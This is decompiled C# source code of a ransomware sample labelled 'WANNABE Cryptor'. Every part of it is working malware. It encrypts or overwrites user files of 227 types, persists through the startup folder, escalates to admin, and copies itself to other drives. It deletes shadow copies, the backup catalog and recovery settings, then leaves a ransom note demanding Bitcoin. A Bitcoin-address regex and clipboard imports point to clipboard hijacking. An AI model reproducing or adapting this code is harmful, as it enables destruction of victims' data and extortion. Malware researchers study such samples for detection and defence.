// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.Program
// Assembly: WANNABE Cryptor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E00B3CBF-CF04-4FE7-82B3-6025D29417D7
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Agent.gen-99f9ffc5e0e9769e9be3c184b828ff8bf4d63cade2492aca281cf3f30891bac0.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  internal class Program
  {
    private static string userName = Environment.UserName;
    private static string userDir = "C:\\Users\\";
    public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
    public static bool encryptionAesRsa = true;
    public static string encryptedFileExtension = "WNBE";
    private static bool checkSpread = true;
    private static string spreadName = "surprise.exe";
    private static bool checkCopyRoaming = true;
    private static string processName = "sdf51ewxzv24d54fg.exe";
    public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
    private static bool checkStartupFolder = true;
    private static bool checkSleep = false;
    private static int sleepTextbox = 10;
    private static string base64Image = "";
    public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
    private static string droppedMessageTextbox = "read_it.txt";
    private static bool checkAdminPrivilage = true;
    private static bool checkdeleteShadowCopies = true;
    private static bool checkdisableRecoveryMode = true;
    private static bool checkdeleteBackupCatalog = true;
    public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";
    public static string appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;
    public static string staticSplit = "bc";
    public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;
    public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
    private static string[] messages = new string[20]
    {
      "Attention!",
      "",
      "All of your files have been encrypted",
      "Your computer was infected with WANNABE Ransomware. Your files have been encrypted and you won't be able to decrypt them without our help.What can I do to get my files back?You can buy our special decryption software, this software will allow you to recover all of your data and remove the",
      "ransomware from your computer.The price for the software is $26.65. Payment can be made in Bitcoin only.",
      "",
      "How do I pay, where do I get Bitcoin?",
      "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search",
      "yourself  to find out how to buy Bitcoin. ",
      "Many of our customers have reported these sites to be fast and reliable:",
      "Coinmama - https://www.coinmama.com or Bitpanda - https://www.bitpanda.com",
      "",
      "Payment informationAmount: 0.00043 BTC",
      "Bitcoin Address: 18vhBpgPhZrjJkbuT2ZyUXAnJavaJcTwEd",
      "",
      "If you're done paying the demand just send a proof that you have done paying the exact amount at",
      "email address provided below in order for us to send to your email the decryption software.",
      "",
      "Email Address: anenomous31@gmail.com",
      ""
    };
    private static string[] validExtensions = new string[227]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".mka",
      ".mhtml",
      ".oqy",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".xla",
      ".cub",
      ".dae",
      ".indd",
      ".cs",
      ".mp3",
      ".mp4",
      ".dwg",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".dib",
      ".dic",
      ".dif",
      ".divx",
      ".iso",
      ".7zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".mpeg",
      ".torrent",
      ".mpg",
      ".core",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".swf",
      ".cer",
      ".bak",
      ".backup",
      ".accdb",
      ".bay",
      ".p7c",
      ".exif",
      ".vss",
      ".raw",
      ".m4a",
      ".wma",
      ".flv",
      ".sie",
      ".sum",
      ".ibank",
      ".wallet",
      ".css",
      ".js",
      ".rb",
      ".crt",
      ".xlsm",
      ".xlsb",
      ".7z",
      ".cpp",
      ".java",
      ".jpe",
      ".ini",
      ".blob",
      ".wps",
      ".docm",
      ".wav",
      ".3gp",
      ".webm",
      ".m4v",
      ".amv",
      ".m4p",
      ".svg",
      ".ods",
      ".bk",
      ".vdi",
      ".vmdk",
      ".onepkg",
      ".accde",
      ".jsp",
      ".json",
      ".gif",
      ".log",
      ".gz",
      ".config",
      ".vb",
      ".m1v",
      ".sln",
      ".pst",
      ".obj",
      ".xlam",
      ".djvu",
      ".inc",
      ".cvs",
      ".dbf",
      ".tbi",
      ".wpd",
      ".dot",
      ".dotx",
      ".xltx",
      ".pptm",
      ".potx",
      ".potm",
      ".pot",
      ".xlw",
      ".xps",
      ".xsd",
      ".xsf",
      ".xsl",
      ".kmz",
      ".accdr",
      ".stm",
      ".accdt",
      ".ppam",
      ".pps",
      ".ppsm",
      ".1cd",
      ".3ds",
      ".3fr",
      ".3g2",
      ".accda",
      ".accdc",
      ".accdw",
      ".adp",
      ".ai",
      ".ai3",
      ".ai4",
      ".ai5",
      ".ai6",
      ".ai7",
      ".ai8",
      ".arw",
      ".ascx",
      ".asm",
      ".asmx",
      ".avs",
      ".bin",
      ".cfm",
      ".dbx",
      ".dcm",
      ".dcr",
      ".pict",
      ".rgbe",
      ".dwt",
      ".f4v",
      ".exr",
      ".kwm",
      ".max",
      ".mda",
      ".mde",
      ".mdf",
      ".mdw",
      ".mht",
      ".mpv",
      ".msg",
      ".myi",
      ".nef",
      ".odc",
      ".geo",
      ".swift",
      ".odm",
      ".odp",
      ".oft",
      ".orf",
      ".pfx",
      ".p12",
      ".pl",
      ".pls",
      ".safe",
      ".tab",
      ".vbs",
      ".xlk",
      ".xlm",
      ".xlt",
      ".xltm",
      ".svgz",
      ".slk",
      ".tar.gz",
      ".dmg",
      ".ps",
      ".psb",
      ".tif",
      ".rss",
      ".key",
      ".vob",
      ".epsp",
      ".dc3",
      ".iff",
      ".onepkg",
      ".onetoc2",
      ".opt",
      ".p7b",
      ".pam",
      ".r3d"
    };
    private static Random random = new Random();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    private static void Main(string[] args)
    {
      if (Program.AlreadyRunning())
        Environment.Exit(1);
      if (Program.checkSleep)
        Program.sleepOutOfTempFolder();
      if (Program.checkAdminPrivilage)
        Program.copyResistForAdmin(Program.processName);
      else if (Program.checkCopyRoaming)
        Program.copyRoaming(Program.processName);
      if (Program.checkStartupFolder)
        Program.addLinkToStartup();
      Program.lookForDirectories();
      if (Program.checkAdminPrivilage)
      {
        if (Program.checkdeleteShadowCopies)
          Program.deleteShadowCopies();
        if (Program.checkdisableRecoveryMode)
          Program.disableRecoveryMode();
        if (Program.checkdeleteBackupCatalog)
          Program.deleteBackupCatalog();
      }
      if (Program.checkSpread)
        Program.spreadIt(Program.spreadName);
      Program.addAndOpenNote();
      Program.SetWallpaper(Program.base64Image);
      new Thread((ThreadStart) (() => Program.Run())).Start();
    }

    public static void Run() => Application.Run((Form) new driveNotification.NotificationForm());

    private static void sleepOutOfTempFolder()
    {
      if (!(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
        return;
      Thread.Sleep(Program.sleepTextbox * 1000);
    }

    private static bool AlreadyRunning()
    {
      Process[] processes = Process.GetProcesses();
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in processes)
      {
        try
        {
          if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location)
          {
            if (currentProcess.Id != process.Id)
              return true;
          }
        }
        catch (Exception ex)
        {
        }
      }
      return false;
    }

    public static byte[] random_bytes(int length)
    {
      Random random = new Random();
      ++length;
      byte[] buffer = new byte[length];
      random.NextBytes(buffer);
      return buffer;
    }

    public static string RandomString(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string RandomStringForExtension(int length)
    {
      if (!(Program.encryptedFileExtension == ""))
        return Program.encryptedFileExtension;
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string Base64EncodeString(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    public static string randomEncode(string plainText)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(plainText);
      return "<EncyptedKey>" + Program.Base64EncodeString(Program.RandomString(41)) + "<EncyptedKey> " + Program.RandomString(2) + Convert.ToBase64String(bytes);
    }

    private static void encryptDirectory(string location)
    {
      try
      {
        string[] files = Directory.GetFiles(location);
        bool flag = true;
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if (Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E == extension.ToLower())))
            {
              if (fileName != Program.droppedMessageTextbox)
              {
                FileInfo fileInfo = new FileInfo(files[index]);
                fileInfo.Attributes = FileAttributes.Normal;
                if (fileInfo.Length < 2117152L)
                {
                  if (Program.encryptionAesRsa)
                    Program.EncryptFile(files[index]);
                }
                else if (fileInfo.Length > 200000000L)
                {
                  string plainText = Encoding.UTF8.GetString(Program.random_bytes(new Random().Next(200000000, 300000000)));
                  File.WriteAllText(files[index], Program.randomEncode(plainText));
                  File.Move(files[index], files[index] + "." + Program.RandomStringForExtension(4));
                }
                else
                {
                  string plainText = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
                  File.WriteAllText(files[index], Program.randomEncode(plainText));
                  File.Move(files[index], files[index] + "." + Program.RandomStringForExtension(4));
                }
                if (flag)
                {
                  flag = false;
                  File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
                }
              }
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(location))
          Program.encryptDirectory(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public static string rsaKey()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
      stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
      stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
      stringBuilder.AppendLine("  <Modulus>y2IaVEqCzug3gAcyKcUXHZTNBpelvQeMeGlYXsmFkU+04pa+7kEpsFp6Q3vc8368RA12zMdliA+e29E9E+RXJGMdjNrQ2Kl3Rv/50Fnuw8GkY7HveJTTt/Vcbzxcs66dRKEBfN60ili337kHcv+f+Kv/81p9N8W5eeUNGbF4yAE=</Modulus>");
      stringBuilder.AppendLine("</RSAParameters>");
      return stringBuilder.ToString();
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public static void EncryptFile(string file)
    {
      byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
      string password = Program.CreatePassword(20);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] inArray = Program.AES_Encrypt(bytesToBeEncrypted, bytes);
      File.WriteAllText(file, "<EncryptedKey>" + Program.RSAEncrypt(password, Program.rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
      File.Move(file, file + "." + Program.RandomStringForExtension(4));
    }

    public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(1024))
      {
        try
        {
          cryptoServiceProvider.FromXmlString(publicKeyString.ToString());
          return Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, true));
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
        }
      }
    }

    private static void lookForDirectories()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
          Program.encryptDirectory(drive.ToString());
      }
      string location1 = Program.userDir + Program.userName + "\\Desktop";
      string location2 = Program.userDir + Program.userName + "\\Links";
      string location3 = Program.userDir + Program.userName + "\\Contacts";
      string location4 = Program.userDir + Program.userName + "\\Desktop";
      string location5 = Program.userDir + Program.userName + "\\Documents";
      string location6 = Program.userDir + Program.userName + "\\Downloads";
      string location7 = Program.userDir + Program.userName + "\\Pictures";
      string location8 = Program.userDir + Program.userName + "\\Music";
      string location9 = Program.userDir + Program.userName + "\\OneDrive";
      string location10 = Program.userDir + Program.userName + "\\Saved Games";
      string location11 = Program.userDir + Program.userName + "\\Favorites";
      string location12 = Program.userDir + Program.userName + "\\Searches";
      string location13 = Program.userDir + Program.userName + "\\Videos";
      Program.encryptDirectory(location1);
      Program.encryptDirectory(location2);
      Program.encryptDirectory(location3);
      Program.encryptDirectory(location4);
      Program.encryptDirectory(location5);
      Program.encryptDirectory(location6);
      Program.encryptDirectory(location7);
      Program.encryptDirectory(location8);
      Program.encryptDirectory(location9);
      Program.encryptDirectory(location10);
      Program.encryptDirectory(location11);
      Program.encryptDirectory(location12);
      Program.encryptDirectory(location13);
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
    }

    private static void copyRoaming(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
    }

    private static void copyResistForAdmin(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      ProcessStartInfo startInfo = new ProcessStartInfo(str4)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str3
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
    }

    private static void addLinkToStartup()
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".url"))
      {
        string location = Assembly.GetExecutingAssembly().Location;
        streamWriter.WriteLine("[InternetShortcut]");
        streamWriter.WriteLine("URL=file:///" + location);
        streamWriter.WriteLine("IconIndex=0");
        string str = location.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static void addAndOpenNote()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      try
      {
        File.WriteAllLines(str, Program.messages);
        Thread.Sleep(500);
        Process.Start(str);
      }
      catch
      {
      }
    }

    private static void registryStartup()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Microsoft Store", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    private static void spreadIt(string spreadName)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
        {
          if (!File.Exists(drive.ToString() + spreadName))
          {
            try
            {
              File.Copy(Assembly.GetExecutingAssembly().Location, drive.ToString() + spreadName);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void deleteShadowCopies() => Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");

    private static void disableRecoveryMode() => Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");

    private static void deleteBackupCatalog() => Program.runCommand("wbadmin delete catalog -quiet");

    public static void SetWallpaper(string base64)
    {
      if (!(base64 != ""))
        return;
      try
      {
        string str = Path.GetTempPath() + Program.RandomString(9) + ".jpg";
        File.WriteAllBytes(str, Convert.FromBase64String(base64));
        Program.SystemParametersInfo(20U, 0U, str, 3U);
      }
      catch
      {
      }
    }

    public static class NativeMethods
    {
      public const int clp = 797;
      public static IntPtr intpreclp = new IntPtr(-3);

      [DllImport("user32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool AddClipboardFormatListener(IntPtr hwnd);

      [DllImport("user32.dll", SetLastError = true)]
      public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
  }
}
